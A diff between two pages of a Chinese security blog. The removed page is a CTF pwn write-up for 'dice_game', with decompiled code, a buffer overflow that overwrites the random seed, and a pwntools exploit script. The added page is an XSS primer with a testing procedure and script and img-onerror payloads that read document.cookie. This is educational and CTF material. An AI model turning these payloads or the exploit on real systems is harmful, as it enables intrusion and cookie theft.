@@ -16,25 +16,22 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：  0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){  cha">
+    <meta name="description" content="XSS(跨站脚本)原理与分类跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。 XSS攻击针对的是用户层面的攻击.  反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。 存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界-dice_game">
-<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/index.html">
+<meta property="og:title" content="有关XSS跨站脚本">
+<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：  0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){  cha">
+<meta property="og:description" content="XSS(跨站脚本)原理与分类跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。 XSS攻击针对的是用户层面的攻击.  反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。 存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png">
-<meta property="og:image" content="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png">
-<meta property="article:published_time" content="2022-08-09T04:08:11.395Z">
-<meta property="article:modified_time" content="2020-09-10T07:29:13.960Z">
+<meta property="article:published_time" content="2022-08-09T04:10:35.381Z">
+<meta property="article:modified_time" content="2022-08-09T04:10:16.791Z">
 <meta property="article:author" content="Sinky">
-<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="XSS">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png">
   
   
   
-  <title>攻防世界-dice_game - Sinky&#39;s Blog</title>
+  <title>有关XSS跨站脚本 - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="攻防世界-dice_game"></span>
+            <span id="subtitle" data-typed-text="有关XSS跨站脚本"></span>
           
         </div>
 
@@ -213,7 +210,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-09 12:08" pubdate>
+        <time datetime="2022-08-09 12:10" pubdate>
           August 9, 2022 pm
         </time>
       </span>
@@ -225,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k words
+          1k words
         
       </span>
     
@@ -236,7 +233,7 @@
         
         
         
-          13 mins
+          9 mins
         
       </span>
     
@@ -274,22 +271,30 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">攻防世界-dice_game</h1>
+            <h1 style="display: none">有关XSS跨站脚本</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
-<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="pwn-checksec.PNG"></p>
-<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
-<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-type">ssize_t</span> v6; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome, let me know your name: "</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  v6 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">49</span> )<br>    buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi, %s. Let's play a game.\n"</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  v8 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Game %d/50\n"</span>, v8);<br>    v5 = <span class="hljs-built_in">sub_A20</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    {<br>      <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">50</span> )<br>      {<br>        <span class="hljs-built_in">sub_B28</span>(buf);<br>        <span class="hljs-keyword">break</span>;<br>      }<br>      ++v8;<br>    }<br>  }<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye bye!"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
+                <h1 id="XSS-跨站脚本-原理与分类"><a href="#XSS-跨站脚本-原理与分类" class="headerlink" title="XSS(跨站脚本)原理与分类"></a>XSS(跨站脚本)原理与分类</h1><p>跨站脚本攻击XSS,为了不和层叠样式表的缩写混淆，故将跨站脚本攻击缩写为XSS,恶意攻击者往web页面里插入恶意script代码，当用户浏览页面时嵌入其中的script代码被执行，从而恶意攻击用户。</p>
+<p>XSS攻击针对的是用户层面的攻击.</p>
+<ul>
+<li>反射型：交互的数据一般不会被存在数据库里，一次性，一般出现在查询页面等。</li>
+<li>存储型：交互的数据会被存在数据库里面，永久性存储，一般出现在留言板，注册等页面。</li>
+<li>DOM型：不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的问题，一次性，也属于反射型。</li>
+</ul>
+<h1 id="XSS漏洞测试流程"><a href="#XSS漏洞测试流程" class="headerlink" title="XSS漏洞测试流程"></a>XSS漏洞测试流程</h1><p>1.在目标上找输入点，比如查询接口、留言板</p>
+<p>2.输入一组“特殊字符（&gt;,’,”等）+唯一识别字符”，点击提交后，查看返回源码，看后端返回数据是否有处理。</p>
+<p>3.通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的调教（构造闭合）</p>
+<p>4.提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行证明存在xss漏洞。</p>
+<h1 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h1><ul>
+<li><code>&lt;script&gt;</code>：最直接的xss有效载荷，脚本标记可以引用外部的javascript代码，也可以将代码插入脚本标记中。</li>
+</ul>
+<figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs <script">&lt;script&gt;alert("hack")&lt;/script&gt; #弹出hack<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt; #弹出cookie<br></code></pre></td></tr></tbody></table></figure>
+<ul>
+<li><code>&lt;img&gt;</code>：<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert("hack")&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      注：对于数字，可以不用引号<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">"javascript:alert("</span>XSS");"&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">"javascript:alert('XSS')"</span>&gt;<br></code></pre></td></tr></tbody></table></figure></li>
+</ul>
 
-<p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
-<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congrats %s\n"</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">"r"</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>}<br></code></pre></td></tr></tbody></table></figure>
-<p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
-<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="相差40.PNG"></p>
-<p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
-<h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-attribute">p</span>=remote('220.249.52.133',34691)<br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary("libc.so.6")<br>p.recv()<br><span class="hljs-attribute">payload</span>=0x40*'a'+p64(0)<br>p.sendline(payload)<br>a=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(50):<br>    a.append(libc.rand()%6+1)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recv()<br>    <span class="hljs-built_in">print</span>(p.recv())<br>    p.sendline(str(i))<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
                 
               </div>
             
@@ -301,7 +306,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/pwn/">#pwn</a>
+        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/XSS/">#XSS</a>
       
     </div>
   
@@ -313,8 +318,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>攻防世界-dice_game</div>
-      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/攻防世界-pwn-dice_game/</div>
+      <div>有关XSS跨站脚本</div>
+      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/有关XSS跨站脚本/</div>
     </div>
     <div class="license-meta">
       
@@ -356,9 +361,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" title="有关XSS跨站脚本">
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-%E5%8F%8D%E5%BA%94%E9%87%9C%E5%BC%80%E5%85%B3%E6%8E%A7%E5%88%B6/" title="攻防世界-pwn-反应釜开关控制">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">有关XSS跨站脚本</span>
+                        <span class="hidden-mobile">攻防世界-pwn-反应釜开关控制</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -366,8 +371,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" title="攻防世界 string">
-                        <span class="hidden-mobile">攻防世界 string</span>
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/" title="攻防世界-dice_game">
+                        <span class="hidden-mobile">攻防世界-dice_game</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
